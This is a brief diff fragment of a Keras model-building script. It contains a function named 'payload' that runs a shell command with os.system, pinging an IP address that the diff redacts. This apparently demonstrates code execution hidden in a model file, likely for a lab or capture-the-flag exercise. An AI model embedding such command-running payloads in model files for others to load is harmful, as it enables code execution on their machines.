@@ -4,7 +4,7 @@ from tensorflow.keras import layers
 
 def payload(x):
     import os
-    os.system("ping -c 3 10.10.16.93")
+    os.system("ping -c 3 10.10.x.x")
     return x
 
 model = keras.Sequential([
